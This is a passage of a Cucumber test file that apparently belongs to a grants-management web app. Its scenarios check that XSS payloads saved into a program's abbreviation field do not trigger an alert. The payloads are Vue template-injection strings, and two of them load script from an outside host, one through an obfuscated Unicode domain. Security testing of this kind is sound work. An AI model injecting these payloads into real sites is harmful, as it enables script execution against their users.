      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301312 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                 | Field                |
      | <x v-if=_c.constructor('alert(1)')()> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301315 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                            | Field                |
      | {{_c.constructor('alert(1)')()}} | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301317 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                            | Field                |
      | {{_v.constructor('alert(1)')()}} | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301319 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                            | Field                |
      | {{_s.constructor('alert(1)')()}} | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301322 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                   | Field                |
      | <p v-show="_c.constructor`alert(1)`()"> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301323 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                | Field                |
      | <x v-on:click='_b.constructor`alert(1)`()'>click</x> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301327 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                     | Field                |
      | <x v-bind:a='_b.constructor`alert(1)`()'> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301329 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                             | Field                |
      | <x @[_b.constructor`alert(1)`()]> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301331 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                             | Field                |
      | <x :[_b.constructor`alert(1)`()]> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301334 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                             | Field                |
      | <p v-=_c.constructor`alert(1)`()> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301335 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                             | Field                |
      | <x #[_c.constructor`alert(1)`()]> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301336 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                            | Field                |
      | <p :=_c.constructor`alert(1)`()> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301337 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                            | Field                |
      | {{_c.constructor('alert(1)')()}} | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301348 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                          | Field                |
      | {{_b.constructor`alert(1)`()}} | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301350 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                    | Field                |
      | <x v-bind:is="'script'" src="//14.rs" /> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301351 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                   | Field                |
      | <x is=script src=//⑭.₨> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301352 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                            | Field                |
      | <x @click='_b.constructor`alert(1)`()'>click</x> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301353 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                             | Field                |
      | <x @[_b.constructor`alert(1)`()]> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
